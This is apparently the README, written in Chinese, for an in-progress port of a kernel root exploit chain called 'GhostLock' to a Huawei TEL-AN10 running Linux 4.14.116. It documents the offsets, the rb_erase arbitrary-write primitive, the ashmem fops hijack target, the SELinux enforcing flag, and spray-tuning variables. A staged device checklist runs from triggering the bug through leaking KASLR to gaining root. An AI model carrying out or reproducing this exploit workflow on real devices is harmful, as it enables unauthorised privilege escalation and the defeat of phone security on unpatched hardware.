# port-4.14 — GhostLock 完整链 4.14 移植（进行中）

repo2 (xpad2 4.19) 完整利用链到 HUAWEI TEL-AN10 (4.14.116) 的移植。
结构保持与 repo2 一致，仅替换内核相关常量。

## 移植状态

| 组件 | 状态 |
|---|---|
| `src/exploit/offset.h` | ✅ 4.14 全部符号 + 结构体偏移（System.map + DWARF 实测） |
| `src/exploit/common.h` | ✅ 4.14 常量（P0 模型、pipe slab、identity 区间） |
| 设备端/主机端/su daemon | ✅ 编译通过（本地 Termux clang + CI NDK r29） |
| 真机验证 | ⏳ 需要设备迭代（见下方清单） |

## 4.14 关键差异（相对 repo2 的 4.19）

1. **KASLR 模型**：4.14 由 `memstart_offset_seed` 随机化线性映射区
   （`ARM64_MEMSTART_ALIGN` 粒度）；xpad2 的固定 P0 映射 (0xffffffc0...)
   在华为 4.14 上不存在。`P0_PAGE_OFFSET = 0xffffff8000000000`
   （4.14 线性映射基址）。若 bootloader 不提供 kaslr-seed 则无偏移。
2. **写目标**：`ashmem_misc.fops` 字段 = `ashmem_misc + 0x10`
   （`ASHMEM_MISC_FOPS_OFF 0x025e9a28`，System.map 实测）。
   写原语 = `rb_erase` 的 `child->__rb_parent_color = pc` 单次指针写：
   `*(fake_pi_node.rb_right) = fake_pi_node.__rb_parent_color`，
   值与地址均完全可控。
3. **rt_mutex_waiter**：4.14 = {tree, pi_tree, task, lock, prio, deadline}
   （无 wake_state/ww_ctx），offset.h 已按 DWARF 实测。
4. **task_struct**：0x10c0（4.19 约 0x830），全部字段偏移已实测。
5. **pipe_inode_info**：0xb8 → kmalloc-256（4.19 是 2KB），
   `KMALLOC_PIPE_INDEX 8`、`PIPE_OBJECT_SIZE 0x100` 已修正。
6. **SELinux**：`selinux_state.enforcing`（+1，[VERIFY]）。
7. **CONFIG_SECURITY_PERF_EVENTS_RESTRICT=y**：出厂系统 shell 无
   perf_event_open 权限，reclaim 的 perf 门控可能失败 →
   用 `IONSTACK_RECLAIM_REQUIRE_ORDER3=0` 等环境变量降级（概率性）。

## 真机验证清单

```bash
# 1. 环境
./root.sh info        # 内核版本 == 4.14.116? kallsyms 可读?
# 2. 漏洞
CONFIRM=yes ./root.sh trigger    # 预期 panic 重启
# 3. 写原语 (boot_id 回读验证)
adb shell /data/local/tmp/... --stage=slide     # 泄漏/验证
# 4. fops 劫持
adb shell /data/local/tmp/... --stage=fops-check
# 5. root
adb shell /data/local/tmp/... --stage=fops-write-root
```

## 调参旋钮（真机按日志调整）

- `IONSTACK_SLIDE_ATTEMPTS` / `IONSTACK_SLIDE_WORD_SHIFT`：栈喷射对齐
- `IONSTACK_RECLAIM_REQUIRE_ORDER3=0`：无 perf 时降级
- `IONSTACK_FOPS_*`：fake waiter 形态（pi_waiters/leftmost/rb_shape/lock_owner）
- `IONSTACK_KASLR_BASE`：手动指定基址（kallsyms 不可读时）

## 参考

- 官方 writeup: https://nebusec.ai/research/ionstack-part-2
  （PR_SET_MM_MAP auxv 栈回收 + rb_erase 单子根写原语 + 目标布局约束）
- 修复 commit: 3bfdc63936dd ("rtmutex: Use waiter::task instead of current
  in remove_waiter()") — 4.14.116 未含此修复，漏洞存在
